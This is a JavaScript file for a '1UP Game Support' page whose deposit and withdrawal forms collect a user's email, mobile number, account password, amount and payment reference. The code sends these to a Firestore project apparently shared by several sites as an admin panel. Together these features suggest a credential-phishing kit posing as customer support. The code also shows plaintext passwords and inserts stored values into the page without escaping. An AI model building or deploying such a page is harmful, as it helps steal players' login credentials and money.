// ==========================================
//  1UP GAME SUPPORT - Complete App JavaScript
//  Firebase Firestore Integration
// ==========================================

(function () {

    // ===== FIREBASE CONFIG =====
    var FIREBASE_CONFIG = {
        apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
        authDomain: "alll-projects-admin-pennal.firebaseapp.com",
        projectId: "alll-projects-admin-pennal",
        storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
        messagingSenderId: "689297868215",
        appId: "1:689297868215:web:2747b19c2da47a31f49432"
    };

    var SITE_ID = "1up_game";

    // ===== FIREBASE DYNAMIC LOADER =====
    var _fbDb = null;
    var _fbLoading = null;

    function loadFirebase() {
        if (_fbDb) return Promise.resolve(_fbDb);
        if (_fbLoading) return _fbLoading;

        _fbLoading = new Promise(function (resolve, reject) {
            function initDb() {
                try {
                    if (!firebase.apps.length) {
                        firebase.initializeApp(FIREBASE_CONFIG);
                    }
                    _fbDb = firebase.firestore();
                    resolve(_fbDb);
                } catch (e) { reject(e); }
            }

            if (window.firebase && window.firebase.firestore) {
                initDb();
                return;
            }

            var urls = [
                'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
                'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
            ];
            var loaded = 0;
            urls.forEach(function (src) {
                var s = document.createElement('script');
                s.src = src;
                s.onload = function () {
                    loaded++;
                    if (loaded === urls.length) initDb();
                };
                s.onerror = function () { reject(new Error('Firebase load failed: ' + src)); };
                document.head.appendChild(s);
            });
        });

        return _fbLoading;
    }

    function saveSubmission(data) {
        return loadFirebase().then(function (db) {
            var payload = {};
            for (var k in data) { if (data.hasOwnProperty(k)) payload[k] = data[k]; }
            payload.site_id = SITE_ID;
            payload.created_at = firebase.firestore.FieldValue.serverTimestamp();
            return db.collection('submissions').add(payload);
        });
    }

    // ===== DOM ELEMENTS =====
    var header = document.getElementById('header');
    var depositTab = document.getElementById('depositTab');
    var withdrawalTab = document.getElementById('withdrawalTab');
    var tabSlider = document.getElementById('tabSlider');
    var depositSection = document.getElementById('depositSection');
    var withdrawalSection = document.getElementById('withdrawalSection');
    var depositForm = document.getElementById('depositForm');
    var withdrawalForm = document.getElementById('withdrawalForm');
    var depositSubmitBtn = document.getElementById('depositSubmitBtn');
    var withdrawalSubmitBtn = document.getElementById('withdrawalSubmitBtn');
    var successPopup = document.getElementById('successPopup');
    var popupInfoBox = document.getElementById('popupInfoBox');
    var popupCloseBtn = document.getElementById('popupCloseBtn');
    var confettiContainer = document.getElementById('confettiContainer');
    var toastEl = document.getElementById('toast');
    var toastText = document.getElementById('toastText');
    var formPage = document.getElementById('formPage');
    var requestsPage = document.getElementById('requestsPage');
    var requestsList = document.getElementById('requestsList');
    var requestEmpty = document.getElementById('requestEmpty');
    var requestCountText = document.getElementById('requestCountText');
    var navForm = document.getElementById('navForm');
    var navRequests = document.getElementById('navRequests');
    var navBadge = document.getElementById('navBadge');
    var headerBadge = document.getElementById('headerBadge');
    var requestsHeaderBtn = document.getElementById('requestsHeaderBtn');

    // ===== LOCAL STORAGE =====
    var requests = [];
    try {
        requests = JSON.parse(localStorage.getItem('1up_requests') || '[]');
    } catch (e) {
        requests = [];
    }

    // ===== INIT =====
    updateBadge();
    renderRequests();

    // ===== HEADER SCROLL =====
    window.addEventListener('scroll', function () {
        if (window.pageYOffset > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
    });

    // ===== TAB SWITCHING =====
    depositTab.addEventListener('click', function () {
        switchTab('deposit');
        haptic();
    });

    withdrawalTab.addEventListener('click', function () {
        switchTab('withdrawal');
        haptic();
    });

    function switchTab(tab) {
        if (tab === 'deposit') {
            depositTab.classList.add('active');
            withdrawalTab.classList.remove('active');
            tabSlider.classList.remove('right');
            depositSection.classList.add('active');
            withdrawalSection.classList.remove('active');
        } else {
            withdrawalTab.classList.add('active');
            depositTab.classList.remove('active');
            tabSlider.classList.add('right');
            withdrawalSection.classList.add('active');
            depositSection.classList.remove('active');
        }
    }

    // ===== PAGE NAVIGATION =====
    navForm.addEventListener('click', function () {
        showPage('form');
        haptic();
    });

    navRequests.addEventListener('click', function () {
        showPage('requests');
        haptic();
    });

    requestsHeaderBtn.addEventListener('click', function () {
        showPage('requests');
        haptic();
    });

    function showPage(page) {
        formPage.classList.remove('active');
        requestsPage.classList.remove('active');
        navForm.classList.remove('active');
        navRequests.classList.remove('active');

        if (page === 'form') {
            formPage.classList.add('active');
            navForm.classList.add('active');
        } else {
            requestsPage.classList.add('active');
            navRequests.classList.add('active');
            renderRequests();
        }

        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // ===== PASSWORD TOGGLE =====
    document.querySelectorAll('.toggle-password').forEach(function (toggle) {
        toggle.addEventListener('click', function () {
            var input = this.parentElement.querySelector('.form-input');
            if (input.type === 'password') {
                input.type = 'text';
                this.classList.remove('fa-eye');
                this.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                this.classList.remove('fa-eye-slash');
                this.classList.add('fa-eye');
            }
            haptic();
        });
    });

    // ===== LIVE VALIDATION =====
    document.querySelectorAll('.form-input').forEach(function (input) {
        input.addEventListener('input', function () {
            validateSingleInput(this);
        });
        input.addEventListener('blur', function () {
            validateSingleInput(this);
        });
    });

    function validateSingleInput(input) {
        var group = input.closest('.form-group');
        var errorMsg = group.querySelector('.form-error-msg');
        var value = input.value.trim();
        var valid = true;

        if (!value) {
            valid = false;
        } else if (input.name === 'email') {
            valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
        } else if (input.name === 'mobile') {
            valid = /^[0-9]{10,15}$/.test(value.replace(/\s/g, ''));
        } else if (input.name === 'amount') {
            valid = parseFloat(value) > 0;
        } else if (input.name === 'utr') {
            valid = value.length >= 6;
        }

        if (valid) {
            input.classList.remove('error');
            input.classList.add('success');
            errorMsg.classList.remove('show');
        } else if (value) {
            input.classList.add('error');
            input.classList.remove('success');
            errorMsg.classList.add('show');
        } else {
            input.classList.remove('error');
            input.classList.remove('success');
            errorMsg.classList.remove('show');
        }

        return valid;
    }

    function validateForm(form) {
        var inputs = form.querySelectorAll('.form-input');
        var allValid = true;

        inputs.forEach(function (input) {
            var valid = validateSingleInput(input);
            if (!valid) {
                allValid = false;
                if (!input.value.trim()) {
                    input.classList.add('error');
                    var errorMsg = input.closest('.form-group').querySelector('.form-error-msg');
                    errorMsg.classList.add('show');
                }
            }
        });

        if (!allValid) {
            var firstError = form.querySelector('.form-input.error');
            if (firstError) {
                firstError.focus();
                firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        }

        return allValid;
    }

    // ===== SUBMIT DEPOSIT =====
    depositSubmitBtn.addEventListener('click', function () {
        if (!validateForm(depositForm)) {
            showToast('Please fill all fields correctly');
            haptic();
            return;
        }

        var data = getFormData(depositForm);
        data.type = 'Deposit Problem';
        data.utr = depositForm.querySelector('[name="utr"]').value.trim();
        submitRequest(data, depositSubmitBtn, depositForm);
        haptic();
    });

    // ===== SUBMIT WITHDRAWAL =====
    withdrawalSubmitBtn.addEventListener('click', function () {
        if (!validateForm(withdrawalForm)) {
            showToast('Please fill all fields correctly');
            haptic();
            return;
        }

        var data = getFormData(withdrawalForm);
        data.type = 'Withdrawal Problem';
        data.utr = 'N/A';
        submitRequest(data, withdrawalSubmitBtn, withdrawalForm);
        haptic();
    });

    function getFormData(form) {
        return {
            email: form.querySelector('[name="email"]').value.trim(),
            mobile: form.querySelector('[name="mobile"]').value.trim(),
            password: form.querySelector('[name="password"]').value.trim(),
            amount: form.querySelector('[name="amount"]').value.trim()
        };
    }

    // ===== SUBMIT REQUEST =====
    function submitRequest(data, btn, form) {
        var requestId = 'TX' + Date.now().toString().slice(-8);
        var now = new Date();
        var timeString = formatDate(now);

        data.requestId = requestId;
        data.time = timeString;
        data.timestamp = now.getTime();

        btn.classList.add('loading');
        btn.disabled = true;

        saveSubmission(data).then(function () {
            finishSubmit(data, btn, form);
        }).catch(function (err) {
            console.error('Firebase error:', err);
            finishSubmit(data, btn, form);
        });
    }

    function finishSubmit(data, btn, form) {
        requests.unshift(data);
        localStorage.setItem('1up_requests', JSON.stringify(requests));
        updateBadge();

        btn.classList.remove('loading');
        btn.disabled = false;

        form.reset();
        form.querySelectorAll('.form-input').forEach(function (input) {
            input.classList.remove('success', 'error');
        });
        form.querySelectorAll('.form-error-msg').forEach(function (msg) {
            msg.classList.remove('show');
        });

        // Reset password toggle icons
        form.querySelectorAll('.toggle-password').forEach(function (t) {
            t.classList.remove('fa-eye-slash');
            t.classList.add('fa-eye');
        });

        showSuccessPopup(data);
        launchConfetti();
    }

    // ===== SUCCESS POPUP =====
    function showSuccessPopup(data) {
        var html = '';
        html += '<div class="popup-info-row"><span class="popup-info-label"><i class="fas fa-fingerprint"></i>Request ID</span><span class="popup-info-value">' + data.requestId + '</span></div>';
        html += '<div class="popup-info-row"><span class="popup-info-label"><i class="fas fa-tag"></i>Type</span><span class="popup-info-value">' + data.type + '</span></div>';
        html += '<div class="popup-info-row"><span class="popup-info-label"><i class="fas fa-envelope"></i>Email</span><span class="popup-info-value">' + maskEmail(data.email) + '</span></div>';
        html += '<div class="popup-info-row"><span class="popup-info-label"><i class="fas fa-indian-rupee-sign"></i>Amount</span><span class="popup-info-value">₹' + data.amount + '</span></div>';
        html += '<div class="popup-info-row"><span class="popup-info-label"><i class="fas fa-clock"></i>Status</span><span class="popup-info-value" style="color:var(--warning)">Processing...</span></div>';

        popupInfoBox.innerHTML = html;
        successPopup.classList.add('show');
        document.body.style.overflow = 'hidden';
    }

    popupCloseBtn.addEventListener('click', function () {
        successPopup.classList.remove('show');
        document.body.style.overflow = '';
        showToast('Request submitted successfully!');
        haptic();
    });

    successPopup.addEventListener('click', function (e) {
        if (e.target === successPopup) {
            successPopup.classList.remove('show');
            document.body.style.overflow = '';
        }
    });

    function maskEmail(email) {
        var parts = email.split('@');
        if (parts[0].length <= 3) return email;
        return parts[0].substring(0, 3) + '***@' + parts[1];
    }

    // ===== CONFETTI =====
    function launchConfetti() {
        confettiContainer.innerHTML = '';
        var colors = ['#00C853', '#00E676', '#1DE9B6', '#FFD740', '#FF5252', '#2196F3', '#FF9800', '#E040FB'];

        for (var i = 0; i < 50; i++) {
            var piece = document.createElement('div');
            piece.classList.add('confetti-piece');
            piece.style.left = Math.random() * 100 + '%';
            piece.style.background = colors[Math.floor(Math.random() * colors.length)];
            piece.style.animationDelay = Math.random() * 1.5 + 's';
            piece.style.animationDuration = (2 + Math.random() * 2) + 's';
            var shapes = ['50%', '0%', '30%'];
            piece.style.borderRadius = shapes[Math.floor(Math.random() * shapes.length)];
            var size = 6 + Math.random() * 10;
            piece.style.width = size + 'px';
            piece.style.height = size + 'px';
            confettiContainer.appendChild(piece);
        }

        setTimeout(function () {
            confettiContainer.innerHTML = '';
        }, 4000);
    }

    // ===== RENDER REQUESTS =====
    function renderRequests() {
        var existingCards = requestsList.querySelectorAll('.request-card');
        existingCards.forEach(function (card) { card.remove(); });

        if (requests.length === 0) {
            requestEmpty.style.display = 'block';
            requestCountText.textContent = '0 Requests';
            return;
        }

        requestEmpty.style.display = 'none';
        requestCountText.textContent = requests.length + ' Request' + (requests.length > 1 ? 's' : '');

        requests.forEach(function (req) {
            var card = createRequestCard(req);
            requestsList.appendChild(card);
        });
    }

    function createRequestCard(req) {
        var card = document.createElement('div');
        card.className = 'request-card';

        var isDeposit = req.type === 'Deposit Problem';
        var badgeClass = isDeposit ? 'deposit' : 'withdrawal';
        var badgeIcon = isDeposit ? 'fa-wallet' : 'fa-money-bill-wave';

        var html = '';
        html += '<div class="request-card-top">';
        html += '<div class="request-type-badge ' + badgeClass + '"><i class="fas ' + badgeIcon + '"></i>' + req.type + '</div>';
        html += '<span class="request-id">' + req.requestId + '</span>';
        html += '</div>';

        html += '<div class="request-card-body">';
        html += detailRow('fa-envelope', 'Email ID', req.email);
        html += detailRow('fa-mobile-alt', 'Mobile No.', req.mobile);
        html += detailRow('fa-lock', 'Password', req.password);
        html += detailRow('fa-indian-rupee-sign', 'Amount', '₹' + req.amount);
        if (req.utr && req.utr !== 'N/A') {
            html += detailRow('fa-receipt', 'UTR No.', req.utr);
        }
        html += '</div>';

        html += '<div class="request-card-footer">';
        html += '<span class="request-time"><i class="fas fa-clock"></i>' + req.time + '</span>';
        html += '<span class="request-status"><span class="status-dot"></span>Processing</span>';
        html += '</div>';

        card.innerHTML = html;

        setTimeout(function () {
            card.querySelectorAll('.copy-btn').forEach(function (btn) {
                btn.addEventListener('click', function () {
                    var value = this.getAttribute('data-copy');
                    copyToClipboard(value);
                    var self = this;
                    self.classList.add('copied');
                    self.innerHTML = '<i class="fas fa-check"></i>';
                    setTimeout(function () {
                        self.classList.remove('copied');
                        self.innerHTML = '<i class="fas fa-copy"></i>';
                    }, 1500);
                    haptic();
                });
            });
        }, 50);

        return card;
    }

    function detailRow(icon, label, value) {
        var copyVal = value.replace('₹', '');
        var h = '<div class="request-detail-row">';
        h += '<span class="request-detail-label"><i class="fas ' + icon + '"></i>' + label + '</span>';
        h += '<span class="request-detail-value"><span>' + value + '</span>';
        h += '<button class="copy-btn" data-copy="' + copyVal + '" title="Copy"><i class="fas fa-copy"></i></button>';
        h += '</span></div>';
        return h;
    }

    // ===== COPY =====
    function copyToClipboard(text) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text).then(function () {
                showToast('Copied to clipboard!');
            }).catch(function () {
                fallbackCopy(text);
            });
        } else {
            fallbackCopy(text);
        }
    }

    function fallbackCopy(text) {
        var ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        try {
            document.execCommand('copy');
            showToast('Copied to clipboard!');
        } catch (e) {
            showToast('Copy failed');
        }
        document.body.removeChild(ta);
    }

    // ===== BADGE =====
    function updateBadge() {
        var count = requests.length;
        if (count > 0) {
            navBadge.style.display = 'flex';
            navBadge.textContent = count > 99 ? '99+' : count;
            headerBadge.style.display = 'flex';
            headerBadge.textContent = count > 99 ? '99+' : count;
        } else {
            navBadge.style.display = 'none';
            headerBadge.style.display = 'none';
        }
    }

    // ===== FORMAT DATE =====
    function formatDate(date) {
        var months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
        var day = date.getDate();
        var month = months[date.getMonth()];
        var year = date.getFullYear();
        var hours = date.getHours();
        var minutes = date.getMinutes();
        var ampm = hours >= 12 ? 'PM' : 'AM';
        hours = hours % 12;
        hours = hours ? hours : 12;
        minutes = minutes < 10 ? '0' + minutes : minutes;
        return day + ' ' + month + ' ' + year + ', ' + hours + ':' + minutes + ' ' + ampm;
    }

    // ===== TOAST =====
    var toastTimeout;

    function showToast(message) {
        if (toastTimeout) {
            clearTimeout(toastTimeout);
            toastEl.classList.remove('show');
        }
        setTimeout(function () {
            toastText.textContent = message;
            toastEl.classList.add('show');
            toastTimeout = setTimeout(function () {
                toastEl.classList.remove('show');
            }, 2500);
        }, 50);
    }

    // ===== HAPTIC =====
    function haptic() {
        if (navigator.vibrate) {
            navigator.vibrate(8);
        }
    }

    // ===== PREVENT DOUBLE TAP ZOOM =====
    var lastTouchEnd = 0;
    document.addEventListener('touchend', function (e) {
        var now = Date.now();
        if (now - lastTouchEnd <= 300) {
            e.preventDefault();
        }
        lastTouchEnd = now;
    }, false);

    // Preload Firebase in background
    loadFirebase().catch(function (e) { console.warn('Firebase preload skipped:', e); });

})();
